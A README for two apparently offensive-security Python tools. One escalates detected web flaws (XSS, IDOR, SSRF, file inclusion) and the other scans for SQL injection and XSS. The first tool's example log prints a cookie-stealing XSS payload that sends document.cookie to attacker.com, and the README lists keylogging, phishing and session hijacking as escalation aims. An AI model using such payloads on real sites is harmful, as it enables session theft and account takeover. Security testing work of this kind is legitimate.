# **Comprehensive Vulnerability Testing (CUT)**

## **Overview**

CUT (Comprehensive Vulnerability Testing) is an advanced tool designed to identify and escalate various security vulnerabilities in an application. It combines detection and exploitation techniques to provide a thorough security assessment.

## **Features**

- **Detection**:
  - Reads detected vulnerabilities from a file.
- **Automated Exploitation**:
  - Uses specific payloads to test different vulnerabilities.
  - Dynamic scanning of endpoints.
- **Vulnerability Tests**:
  - Insecure Direct Object References (IDOR)
  - Cross-Site Scripting (XSS)
  - Server-Side Request Forgery (SSRF)
  - Local/Remote File Inclusion (LFI/RFI)
  - Privilege Escalation
- **XSS Escalation Techniques**:
  - Session Hijacking
  - Phishing
  - Keylogging
  - Stealing Sensitive Data
  - Defacement
- **Contextual Risk Assessment**:
  - Evaluates business and user impact.
- **Logging and Reporting**:
  - Logs each step and generates a comprehensive report.

## **Installation**

To install the required dependencies, run:

```bash
pip install requests
```

## **Usage**

1. **Prepare an Input File**: Create a text file with detected vulnerabilities. Each line should follow the format: `endpoint,param,vuln_type`.
2. **Run the Program**: Execute the script with the file path to the input file.

```bash
python cut.py
```

## **Example Input File**

```
https://example.com/search,query,XSS
https://example.com/login,username,SQL Injection
https://example.com/profile,user_id,IDOR
```

## **Output**

The program logs all actions and results to a file named `combined_vulnerability_report.log`.

## **Example Output**

```log
2025-01-02 07:38:12 - Loaded 3 vulnerabilities
2025-01-02 07:38:12 - Escalating XSS vulnerability at https://example.com/search with parameter query
2025-01-02 07:38:13 - Testing XSS with payload: <script>alert('XSS')</script>
2025-01-02 07:38:13 - Potential XSS vulnerability detected with payload '<script>alert('XSS')</script>'
2025-01-02 07:38:14 - Testing XSS escalation with payload: <script>document.location='http://attacker.com?cookie='+document.cookie</script>
2025-01-02 07:38:14 - Response Status Code: 200
...
2025-01-02 07:38:20 - Report saved to /path/to/output/combined_vulnerability_report.log
```

# **Vulnerability Detection Program**

## **Overview**

This program scans for potential vulnerabilities in a given application by analyzing specified endpoints and parameters. It identifies common vulnerabilities such as SQL injection, Cross-Site Scripting (XSS), and Insecure Direct Object References (IDOR).

## **Features**

- **SQL Injection Detection**: Identifies possible SQL injection points.
- **Cross-Site Scripting (XSS) Detection**: Detects potential XSS vulnerabilities.
- **Insecure Direct Object References (IDOR) Detection**: Finds IDOR vulnerabilities.
- **Logging**: Logs all detected vulnerabilities for further analysis.

## **Installation**

To install the required dependencies, run:

```bash
pip install requests
```

## **Usage**

1. **Input File**: Prepare a text file with endpoints and parameters to test.
2. **Run the Program**: Execute the script with the file path to the input file.
   ```bash
   python vulnerability_detection.py
   ```

## **Example Input File**

```text
https://example.com/search,query,XSS
https://example.com/login,username,SQL Injection
```

## **Output**

The program logs detected vulnerabilities to a file named `vulnerability_detection.log`.

## **Example Output**

```log
2025-01-02 07:38:12 - Loaded 2 vulnerabilities
2025-01-02 07:38:12 - Testing SQL Injection vulnerability at https://example.com/login with parameter username
2025-01-02 07:38:13 - Potential SQL Injection vulnerability detected with parameter 'username'
2025-01-02 07:38:14 - Testing XSS vulnerability at https://example.com/search with parameter query
2025-01-02 07:38:15 - Potential XSS vulnerability detected with parameter 'query'
...
2025-01-02 07:38:20 - Report saved to /path/to/output/vulnerability_detection.log
```

## **Dependencies**

- Python 3.x
- `requests` library
